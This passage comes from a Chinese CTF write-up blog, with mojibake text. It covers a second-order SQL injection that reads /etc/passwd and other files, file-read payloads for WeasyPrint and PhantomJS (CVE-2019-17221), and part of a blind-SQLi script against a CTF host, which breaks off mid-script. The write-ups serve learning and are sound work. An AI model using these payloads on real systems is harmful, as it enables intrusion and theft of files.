&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;login&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;yes&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./login.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;do&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#00a8c8">switch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;do&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;write&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;span style="color:#111">$category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;category&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;title&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;insert into board
&lt;/span>&lt;span style="color:#d88200"> set category = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$category&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
&lt;/span>&lt;span style="color:#d88200"> title = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$title&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
&lt;/span>&lt;span style="color:#d88200"> content = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$content&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;comment&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;span style="color:#111">$bo_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;bo_id&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;select category from board where id=&amp;#39;&lt;/span>&lt;span style="color:#d88200">$bo_id&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_num_rows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_fetch_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#d88200">&amp;#39;category&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">addslashes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;insert into comment
&lt;/span>&lt;span style="color:#d88200"> set category = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$category&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
&lt;/span>&lt;span style="color:#d88200"> content = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$content&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
&lt;/span>&lt;span style="color:#d88200"> bo_id = &amp;#39;&lt;/span>&lt;span style="color:#d88200">$bo_id&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./comment.php?id=&lt;/span>&lt;span style="color:#d88200">$bo_id&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: ./index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥çœ‹åˆ°åªæœ‰&lt;code>category&lt;/code>æ²¡æœ‰è¢«&lt;code>addslashes&lt;/code>è¿‡æ»¤ï¼Œæ˜¯ç›´æŽ¥å°†æ‰§è¡Œçš„ç»“æžœè¿›è¡Œæ‹¼æŽ¥ï¼Œè¿™é‡Œæ˜¯æˆ‘ä»¬çš„å…¥æ‰‹ç‚¹ï¼›å…ˆåœ¨writeå¤„æ’å…¥ï¼Œå†åœ¨commentå¤„é—­åˆå‰é¢çš„æ³¨é‡Šç¬¦ï¼Œæ‰§è¡Œç»“æžœ&lt;/p>
&lt;pre tabindex="0">&lt;code>write: category=',content=user(),/*
comment: content=*/#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210624160242124.png" alt="image-20210624160242124.png">&lt;/p>
&lt;pre tabindex="0">&lt;code>write: category=',content=(select load_file('/etc/passwd')),/*
comment: content=*/#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210624160515229.png" alt="">&lt;/p>
&lt;p>çœ‹åˆ°æœ€åŽä¸€è¡Œçš„wwwç”¨æˆ·ï¼Œç»§ç»­æŸ¥çœ‹.bash_historyè®°å½•&lt;/p>
&lt;pre tabindex="0">&lt;code>write: category=',content=(select load_file('/home/www/.bash_history')),/*
comment: content=*/#
&lt;/code>&lt;/pre>&lt;p>çœ‹åˆ°äº†.DS_Storeæ–‡ä»¶ï¼Œåœ¨linuxä¸­å®ƒçš„ä½ç½®ä¸€èˆ¬åœ¨&lt;code>/tmp&lt;/code>ä¸‹ï¼ŒåŒæ—¶.DS_Storeä¸­ç»å¸¸æœ‰ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥åŠ ä¸€å±‚hexå†è¯»å‡º&lt;/p>
&lt;pre tabindex="0">&lt;code>write: category=',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
comment: content=*/#
&lt;/code>&lt;/pre>&lt;p>çœ‹åˆ°flag_8946e1ff1ee3e40f.phpï¼Œä¹ŸåŠ ä¸€å±‚hex&lt;/p>
&lt;pre tabindex="0">&lt;code>write: category=',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*
comment: content=*/#
&lt;/code>&lt;/pre>&lt;p>â€”â€”â€”â€”é›€é£Ÿå¾ˆç‰›é€¼çš„äºŒæ¬¡æ³¨å…¥&lt;/p>
&lt;/details>
&lt;h2 id="page-07">page 07&lt;/h2>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[FireshellCTF2020]URL TO PDF
&lt;/h4>
&lt;/summary>
&lt;p>ä¼šè®¿é—®ç»™å‡ºçš„ç½‘å€ï¼Œå¹¶æŠŠç»“æžœè½¬ä¸ºpdfå‘ˆçŽ°å‡ºæ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209135327858.png" alt="image-20211209135327858">&lt;/p>
&lt;p>è¿™ä¸ªè¯·æ±‚å¤´æ˜¾ç¤ºæ˜¯WeasyPrint 51ï¼Œgoogleå¯ä»¥æœåˆ°è¿™ä¸€ç¯‡https://hackerone.com/reports/508123&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209135724639.png" alt="image-20211209135724639">&lt;/p>
&lt;p>å¦‚æžœé¡µé¢ä¸Šå­˜åœ¨è¿™æ ·çš„æ ‡ç­¾&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">link&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;attachment&amp;#34;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file:///flag&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">a&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;attachment&amp;#39;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;file:///flag&amp;#39;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°±ç›¸å½“äºŽSSRFè¯·æ±‚äº†ï¼Œå¹¶æŠŠç»“æžœé™„åˆ°pdfä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨binwalkåˆ†ç¦»ä¸€ä¸‹å†…å®¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">binwalk -e xxx.pdf
cat *&lt;span style="color:#111">|&lt;/span>grep flag
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209140940401.png" alt="image-20211209140940401">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://guokeya.github.io/post/HixADj8UG/">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[FireshellCTF2020]ScreenShooter
&lt;/h4>
&lt;/summary>
&lt;p>è·Ÿä¸Šé¢é‚£ä¸ªå‰ç«¯ä¸€æ ·ï¼Œä¸è¿‡åŒºåˆ«æ˜¯ä¼šè¿”å›žæ‹çš„ç…§ç‰‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209141637106.png" alt="image-20211209141637106">&lt;/p>
&lt;p>çœ‹è¯·æ±‚å¤´ç”¨çš„æ˜¯PhantomJSï¼Œæœåˆ°äº†è¿™æ ·ä¸€ç¯‡ï¼š&lt;a href="https://github.com/h4ckologic/CVE-2019-17221/blob/master/PhantonJS_Arbitrary_File_Read.pdf">PhantonJS_Arbitrary_File_Read.pdf&lt;/a>ï¼Œä¸€ä¸ªå·²çŸ¥çš„cve-2019-17221&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">amiz&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">amiz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">amiz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">responseText&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">amiz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;file:///flag&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šé€ æˆXHRè¯·æ±‚ï¼Œä»»æ„æ–‡ä»¶è¯»å–&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[De1CTF 2019]ShellShellShell
&lt;/h4>
&lt;/summary>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209165342209.png" alt="image-20211209165342209">&lt;/p>
&lt;p>æ˜¯N1ctf2018çš„easyphp+2018ä¸Šæµ·å¸‚èµ›web3çš„ç¼åˆ+æ”¹ç¼–ï¼Œä¸è¿‡è¿™ä¿©æˆ‘éƒ½æ²¡åšè¿‡ï¼Œè¿™æ˜¯&lt;a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540">N1é¢˜çš„wp&lt;/a>ï¼Œè¿™æ˜¯&lt;a href="https://cloud.tencent.com/developer/article/1360551">web3çš„wp&lt;/a>&lt;/p>
&lt;p>é¦–å…ˆæ˜¯æºç æ³„éœ²&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php~
/user.php~
/config.php~
/views/index
/views/login
/views/logout
/views/register
/views/profile
/views/publish
/views/delete
/views/phpinfo
&lt;/code>&lt;/pre>&lt;p>åœ¨user.phpä¸­æœ‰å¾ˆå¤šsqlçš„æ“ä½œï¼Œç»“åˆè¿™äº›å‡½æ•°æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªåä¸ºctf_usersdçš„è¡¨ï¼Œæœ‰username, password, allow_diff_ip, id, is_admin, ipè¿™å‡ åˆ—ï¼›åœ¨registerå‡½æ•°é¢å¤–æœ‰å‡ºé¢˜äººçš„ä¸€ä¸ªæ³¨é‡Šåšæç¤ºç”¨ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€å¥ç›´æŽ¥æŠŠis_adminèµ‹å€¼ä¸º0&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209182038835.png" alt="image-20211209182038835">&lt;/p>
&lt;p>è·Ÿå…¥config.phpçœ‹æœ‰å…³äºŽsqlçš„å¤„ç†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209181300244.png" alt="image-20211209181300244">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209182606221.png" alt="image-20211209182606221">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209183227753.png" alt="image-20211209183227753">&lt;/p>
&lt;p>åŒ¹é…åå¼•å·ç„¶åŽä¼šè¢«æ›¿æ¢ä¸ºå•å¼•å·ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠæˆ‘ä»¬sqlæ³¨å…¥çš„payloadç”±å•å¼•å·æ¢æˆåå¼•å·å³å¯&lt;/p>
&lt;p>ç”±äºŽæ³¨å†Œæˆä¸æˆåŠŸä»€ä¹ˆçš„å›žæ˜¾æ²¡æœ‰å·®åˆ«ï¼Œæ‰€ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼›å¦å¤–è¿™é‡Œæœ‰ä¸¤ä¸ªåœ°æ–¹éƒ½å¯ä»¥sqliï¼Œä¸€ä¸ªæ˜¯register()å¤„ä¸€ä¸ªæ˜¯publishå¤„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210090633660.png" alt="image-20211210090633660">&lt;/p>
&lt;p>publishè¿™é‡Œæ˜¯æ³¨å†ŒåŽå°±å¯ä»¥ç›´æŽ¥ä¼ å‚ï¼Œè€Œregisteré‚£é‡Œè¿˜è¦ç”¨md5ä¸åœåœ°ç”ŸæˆéªŒè¯ç ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©æ³¨å†Œä¸€ä¸ªå·ç„¶åŽç”¨publishè¿™é‡Œä½œä¸ºæ³¨å…¥ç‚¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">md5_val&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">999999&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">100000000&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">md5_value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">hashlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">md5_value&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">md5_val&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ac7a2&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ—¶é—´ç›²æ³¨å»ºè®®è¿˜æ˜¯ä¸¤ä¸ªforå¾ªçŽ¯å§ï¼ŒäºŒåˆ†ä¸çŸ¥é“ä¸ºå•¥ä¸€ç›´å‡ºé—®é¢˜&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://a4a900d6-ddc6-42eb-b95c-7e63d56d9bba.node4.buuoj.cn:81/index.php?action=publish&amp;#34;&lt;/span>
&lt;span style="color:#111">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;PHPSESSID&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;5j1p272lfmi425cpmkv9lik9o7&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;mood&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#39;0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
